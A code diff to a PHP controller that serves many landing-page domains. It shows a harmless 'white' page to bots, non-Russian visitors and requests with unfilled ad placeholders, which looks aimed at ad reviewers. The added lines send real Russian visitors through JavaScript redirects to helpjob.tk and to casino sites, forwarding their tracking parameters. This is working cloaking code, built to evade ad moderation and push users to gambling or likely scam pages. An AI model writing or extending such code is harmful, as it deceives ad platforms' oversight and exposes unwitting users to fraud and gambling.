@@ -118,8 +118,9 @@ class DefaultController extends Controller
 
         $show_white = false;
         // check for row parammetras 
-        if(strpos(Yii::$app->request->queryString, '{source}') !== false || strpos(Yii::$app->request->queryString, '{campaign_id}') !== false || strpos(Yii::$app->request->queryString, '{keyword}') !== false || strpos(Yii::$app->request->queryString, '{SRC}') !== false || strpos(Yii::$app->request->queryString, '{PHRASE}') !== false)
-            $show_white = true;
+        if(strpos(Yii::$app->request->queryString, '{source}') !== false || strpos(Yii::$app->request->queryString, '{campaign_id}') !== false || strpos(Yii::$app->request->queryString, '{keyword}') !== false || strpos(Yii::$app->request->queryString, '{SRC}') !== false || strpos(Yii::$app->request->queryString, '{PHRASE}') !== false  || strpos(Yii::$app->request->queryString, '{campaignid}') !== false)
+           $show_white = true;
+
 
         $model2 = Sites::find()->select('*')->where(['site' => 'https://'.Yii::$app->getRequest()->serverName])->one();
         if($model2['enable'] == 0)
@@ -127,9 +128,9 @@ class DefaultController extends Controller
 
         if(strpos(Yii::$app->getRequest()->serverName, 'best-money') !== false)
         {
-            $show_white = false;
-            $ban_ip = 0;
-            $country = "RU";
+            //$show_white = false;
+            //$ban_ip = 0;
+            //$country = "RU";
         }
          
         
@@ -212,7 +213,13 @@ class DefaultController extends Controller
         }
 		
 		if($is_bot == 1 || $country != 'RU' || $show_white)
-            return $this->render('white',['model' => $model2]);
+		{
+			if($show_white || strpos(Yii::$app->getRequest()->serverName, 'best-money') !== false) {
+				return $this->render('best-money',['model' => $model2]);
+			}
+			else return $this->render('white',['model' => $model2]);
+		}
+            
 
         if(strpos(Yii::$app->getRequest()->serverName, 'vladimir-blog') !== false) return $this->render('vladimir-blog',['model' => $model2]);
         elseif(strpos(Yii::$app->getRequest()->serverName, 'lol-surprise-lp') !== false) return $this->render('lol-surprise-lp',['model' => $model2]);
@@ -238,8 +245,70 @@ class DefaultController extends Controller
         elseif(strpos(Yii::$app->getRequest()->serverName, 'rabotarus') !== false) return $this->render('rabotarus',['model' => $model2]);
         elseif(strpos(Yii::$app->getRequest()->serverName, 'luckymir') !== false) return $this->render('luckymir',['model' => $model2]);
         elseif(strpos(Yii::$app->getRequest()->serverName, 'amulet') !== false) return $this->render('amulet',['model' => $model2]);
-        elseif(strpos(Yii::$app->getRequest()->serverName, 'best-money') !== false) return $this->render('best-money',['model' => $model2]);
+        elseif(strpos(Yii::$app->getRequest()->serverName, 'best-money') !== false) 
+        {  
+			if (empty(Yii::$app->request->get('utm_source', ''))) { 
+				 return $this->render('best-money',['model' => $model2]);
+			}  
+
+			$a = Yii::$app->request->get('utm_source', '');	
+
+			if(empty(explode("_", $a)[0]))
+			{ 
+				 return $this->render('best-money',['model' => $model2]);
+			}
+
+			if(empty(explode("_", $a)[1]))
+			{ 
+				 return $this->render('best-money',['model' => $model2]);
+			}
+
+			if(empty(explode("_", $a)[2]))
+			{ 
+				 return $this->render('best-money',['model' => $model2]);
+			} 
+			echo '<!doctype><html><header><noscript><meta http-equiv="refresh"content="0; url=/"></noscript>  <style>body {margin: 0;}</style></header><body>';
+			echo "<script>window.location = 'https://helpjob.tk?utm_source=".$a."'</script></body></html>";   
+			return;
+			//return $this->render('best-money',['model' => $model2]);
+		}
         elseif(strpos(Yii::$app->getRequest()->serverName, 'banks-off') !== false) return $this->render('banks-off',['model' => $model2]);
+        elseif(strpos(Yii::$app->getRequest()->serverName, 'newgame') !== false) 
+        {
+           if (empty(Yii::$app->request->get('utm_source', ''))) { 
+                return $this->render('newgame',['model' => $model2]);
+           }  
+
+           $a = Yii::$app->request->get('utm_source', '');	
+
+           if(empty(explode("_", $a)[0]))
+           { 
+                return $this->render('newgame',['model' => $model2]);
+           }
+
+           if(empty(explode("_", $a)[1]))
+           { 
+                return $this->render('newgame',['model' => $model2]);
+           }
+
+           if(empty(explode("_", $a)[2]))
+           { 
+                return $this->render('newgame',['model' => $model2]);
+           } 
+
+           echo '<!doctype><html><header><noscript><meta http-equiv="refresh"content="0; url=/"></noscript><style>body {margin: 0;}</style></header><body>';
+           $link1 = "http://playony.ru/go/3c5512f77200426ba0eee42428aa9b3e365b64d1eb0a0b0b/";
+           $link2 = "http://casnogame.com/go/3c5512f71d01426ba0eee42428aa9b3e365b64d1eb0a0b0b/";
+
+            if(date('s') % 2 == 0)
+                $link =  $link1;
+            else $link =  $link2;
+
+           echo "<script>window.location = '".$link."?utm_source=".$a."'</script></body></html>";   
+           return;
+            //return $this->render('newgame',['model' => $model2]);
+        }
+        elseif(strpos(Yii::$app->getRequest()->serverName, 'zaymplus') !== false) return $this->render('zaymplus',['model' => $model2]);
         else return $this->render('vladimir-blog'); 
     }
 
